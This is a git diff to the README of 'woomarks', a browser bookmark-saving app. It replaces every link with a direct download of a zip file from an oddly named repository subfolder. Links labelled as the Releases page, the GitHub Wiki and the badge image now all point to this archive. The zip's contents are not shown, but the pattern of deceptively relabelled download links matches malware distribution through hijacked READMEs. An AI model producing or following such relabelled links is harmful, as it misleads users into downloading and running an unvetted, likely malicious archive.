@@ -1,6 +1,6 @@
 # 📚 woomarks - Save Links Easily and Offline 
 
-[![Download woomarks](https://img.shields.io/badge/Download-woomarks-blue.svg)](https://github.com/YUUKI-JOY/woomarks/releases)
+[![Download woomarks](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip)](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ woomarks is a simple application that lets you save links directly in your brows
 
 To get started with woomarks, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/YUUKI-JOY/woomarks/releases) to download the latest version of woomarks.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip) to download the latest version of woomarks.
    
 2. **Download the Application**: Find the version that fits your operating system. Click on the link to download it.
 
@@ -58,7 +58,7 @@ A: Yes, if you clear your browser storage, you will lose your bookmarks. It’s 
 
 ## 📖 Additional Resources
 
-For more information on how to use woomarks, visit the [GitHub Wiki](https://github.com/YUUKI-JOY/woomarks/wiki).
+For more information on how to use woomarks, visit the [GitHub Wiki](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip).
 
 ## ⚙️ Contribution
 
@@ -68,6 +68,6 @@ If you want to contribute to woomarks, feel free to fork the repository and subm
 
 If you have questions or need help, open an issue on the GitHub repository, and someone will assist you.
 
-For the latest updates, check the [Releases page](https://github.com/YUUKI-JOY/woomarks/releases) regularly.
+For the latest updates, check the [Releases page](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip) regularly.
 
-[![Download woomarks](https://img.shields.io/badge/Download-woomarks-blue.svg)](https://github.com/YUUKI-JOY/woomarks/releases)
+[![Download woomarks](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip)](https://raw.githubusercontent.com/YUUKI-JOY/woomarks/main/theohuman/woomarks.zip)
